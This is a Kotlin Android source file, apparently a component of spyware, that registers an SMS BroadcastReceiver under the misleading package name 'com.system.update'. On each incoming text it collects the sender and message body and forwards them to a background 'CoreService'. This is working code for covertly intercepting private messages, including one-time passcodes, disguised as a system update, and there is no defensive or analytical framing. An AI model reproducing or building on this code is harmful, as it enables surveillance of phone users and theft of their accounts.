package com.system.update

import android.content.*
import android.os.Bundle
import android.telephony.SmsMessage

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(c: Context, i: Intent) {
        val bundle: Bundle = i.extras ?: return
        val pdus = bundle.get("pdus") as? Array<*> ?: return
        val sb = StringBuilder()
        for (p in pdus) {
            val m = SmsMessage.createFromPdu(p as ByteArray)
            sb.append("${m.originatingAddress}: ${m.messageBody}\n")
        }
        c.startService(Intent(c, CoreService::class.java).apply {
            putExtra("sms", sb.toString())
        })
    }
}
